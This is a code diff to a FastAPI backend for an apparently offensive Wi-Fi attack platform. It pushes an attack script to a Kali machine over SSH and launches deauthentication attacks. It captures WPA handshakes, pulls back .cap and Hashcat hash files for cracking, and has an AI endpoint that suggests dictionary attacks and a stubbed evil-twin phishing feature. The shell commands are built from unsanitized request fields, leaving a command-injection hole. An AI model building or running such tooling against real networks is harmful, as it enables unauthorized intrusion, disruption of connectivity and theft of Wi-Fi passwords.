@@ -1,4 +1,5 @@
 from fastapi import APIRouter, HTTPException
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 from app.modules.ai_agent.service import ai_service
 from app.core.ssh_manager import ssh_client
@@ -24,84 +25,72 @@ class AIAnalysisRequest(BaseModel):
     bssid: str
 
 
-# === 🛡️ 智能脚本定位 (解决 500 错误的核心) ===
+# === 🛡️ 智能脚本定位 ===
 def find_payload_script(script_name: str):
-    """在项目级范围内递归查找脚本"""
-    # 获取当前文件绝对路径
     current_file = Path(__file__).resolve()
-
-    # 定义搜索锚点
     search_paths = [
-        current_file.parents[5] / "kali_payloads" / script_name,  # 标准结构
-        current_file.parents[4] / "kali_payloads" / script_name,  # 备用结构
-        Path.cwd() / "kali_payloads" / script_name,  # 运行目录
-        Path.cwd().parent / "kali_payloads" / script_name,  # 上级目录
+        current_file.parents[5] / "kali_payloads" / script_name,
+        current_file.parents[4] / "kali_payloads" / script_name,
+        Path.cwd() / "kali_payloads" / script_name,
+        Path.cwd().parent / "kali_payloads" / script_name,
     ]
-
     for p in search_paths:
-        if p.exists():
-            print(f"[DEBUG] Found script at: {p}")
-            return str(p)
-
-    print(f"[!] CRITICAL: 找不到脚本 {script_name}。已搜索: {[str(p) for p in search_paths]}")
+        if p.exists(): return str(p)
     return None
 
 
 # =======================
-# 1. Deauth 攻击接口 (修复 500)
+# 1. 文件下载接口 (新增)
+# =======================
+@router.get("/download/{filename}")
+async def download_file(filename: str):
+    """下载 captures 目录下的文件"""
+    # 安全检查: 防止目录遍历
+    if ".." in filename or "/" in filename:
+        raise HTTPException(400, "Invalid filename")
+
+    file_path = Path.cwd() / "captures" / filename
+    if not file_path.exists():
+        raise HTTPException(404, "File not found")
+
+    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')
+
+
+# =======================
+# 2. Deauth 攻击接口
 # =======================
 @router.post("/deauth")
 async def start_deauth_attack(req: AttackRequest):
-    print(f"[*] 收到 Deauth 请求: {req.bssid} on {req.interface}")
-
     if not ssh_client.client:
         try:
             ssh_client.connect()
         except Exception as e:
-            raise HTTPException(500, f"SSH 连接失败: {str(e)}")
+            raise HTTPException(500, f"SSH连接失败: {str(e)}")
 
-    # 1. 查找脚本
     script_name = "attack_worker.py"
     local_path = find_payload_script(script_name)
-
-    if not local_path:
-        raise HTTPException(500, f"服务端缺失 {script_name}，请检查 kali_payloads 文件夹")
+    if not local_path: raise HTTPException(500, f"缺失 {script_name}")
 
     try:
-        # 2. 上传脚本
         remote_path = ssh_client.upload_payload(local_path, script_name)
-        if not remote_path:
-            raise HTTPException(500, "脚本上传到 Kali 失败")
-
-        # 3. 执行命令 (nohup 后台运行)
         duration = int(req.duration)
         cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
-
-        print(f"[*] Executing: {cmd}")
         ssh_client.exec_command(cmd)
-
         return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
-
     except Exception as e:
-        print(f"[!] 攻击异常: {e}")
         raise HTTPException(500, f"执行异常: {str(e)}")
 
 
 # =======================
-# 2. 握手包捕获接口
+# 3. 握手包捕获接口 (升级版)
 # =======================
 @router.post("/handshake")
 async def start_handshake_capture(req: AttackRequest):
     print(f"[*] 收到握手包捕获请求: {req.bssid}")
-
-    if not ssh_client.client:
-        ssh_client.connect()
+    if not ssh_client.client: ssh_client.connect()
 
     script_name = "attack_worker.py"
     local_path = find_payload_script(script_name)
-    if not local_path:
-        raise HTTPException(500, f"服务端缺失 {script_name}")
-
     remote_path = ssh_client.upload_payload(local_path, script_name)
 
     # 同步执行
@@ -114,12 +103,14 @@ async def start_handshake_capture(req: AttackRequest):
         output = stdout.read().decode()
         print(f"[DEBUG] Kali Output:\n{output}")
 
-        # 判断结果
+        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}
+        local_dir = Path.cwd() / "captures"
+        if not local_dir.exists(): local_dir.mkdir()
+
+        # 1. 处理 .cap 文件
         if "CAPTURED_HS_POTENTIAL" in output:
-            # 尝试下载结果
             cap_files = [f"/tmp/handshake_{req.bssid.replace(':', '')}-01.cap",
                          f"/tmp/handshake_{req.bssid.replace(':', '')}-01.pcap"]
-
             remote_cap = None
             for f in cap_files:
                 _in, _out, _err = ssh_client.exec_command(f"ls {f}")
@@ -128,55 +119,48 @@ async def start_handshake_capture(req: AttackRequest):
                     break
 
             if remote_cap:
-                local_dir = Path.cwd() / "captures"
-                if not local_dir.exists():
-                    local_dir.mkdir()
+                ts = int(time.time())
+                local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"
+                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
+                    response_data["status"] = "success"
+                    response_data["msg"] = "成功捕获握手包"
+                    response_data["cap_file"] = local_cap
 
-                local_filename = f"handshake_{req.bssid.replace(':', '')}_{int(time.time())}.cap"
-                local_save_path = local_dir / local_filename
+            # 2. 处理 .hc22000 文件 (Hashcat)
+            if "Hash file generated" in output:
+                remote_hash = f"/tmp/handshake_{req.bssid.replace(':', '')}.hc22000"
+                local_hash = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"
 
-                success = ssh_client.download_file(remote_cap, str(local_save_path))
-                if success:
-                    return {"status": "success", "msg": "成功捕获并下载握手包", "file": local_filename}
+                # 检查远程文件是否存在
+                _in, _out, _err = ssh_client.exec_command(f"ls {remote_hash}")
+                if not _err.read():
+                    if ssh_client.download_file(remote_hash, str(local_dir / local_hash)):
+                        response_data["hash_file"] = local_hash
 
-        return {"status": "failed", "msg": "未捕获到握手包", "debug": output}
+        return response_data
 
     except Exception as e:
         return {"status": "error", "msg": str(e)}
 
 
 # =======================
-# 3. AI 分析接口 (修复 undefined)
+# 4. AI 分析 & Mock
 # =======================
 @router.post("/ai/analyze_target")
 async def analyze_target(req: AIAnalysisRequest):
     try:
-        # 调用 AI 服务
-        raw_result = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
-
-        # 强制格式检查 (兜底逻辑)
-        if isinstance(raw_result, dict) and "risk_level" in raw_result:
-            return raw_result
-
-        # 如果 AI 返回了奇怪的东西，手动封装
-        print(f"[WARN] AI 返回格式异常: {raw_result}")
+        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
+        if isinstance(raw, dict) and "risk_level" in raw: return raw
         return {
             "risk_level": "中 (Medium)",
-            "summary": "AI 服务暂未返回标准数据，根据加密方式推测。",
-            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包并运行 rockyou.txt 字典。",
-            "dict_rules": ["纯数字", "手机号段", "生日组合"]
+            "summary": "AI 服务暂未返回标准数据。",
+            "advice": "目标使用 WPA/WPA2 加密。建议尝试捕获握手包。",
+            "dict_rules": ["纯数字", "手机号段"]
         }
     except Exception as e:
-        print(f"[ERROR] AI 服务报错: {e}")
-        return {
-            "risk_level": "未知 (Unknown)",
-            "summary": "AI 分析服务不可用。",
-            "advice": f"系统错误: {str(e)}",
-            "dict_rules": []
-        }
+        return {"risk_level": "Unknown", "summary": "Error", "advice": str(e), "dict_rules": []}
 
 
 @router.post("/eviltwin/start")
 async def start_evil_twin(req: dict):
-    # 简化版 Mock，防止报错
     return {"status": "started", "msg": "钓鱼功能演示模式已启动"}
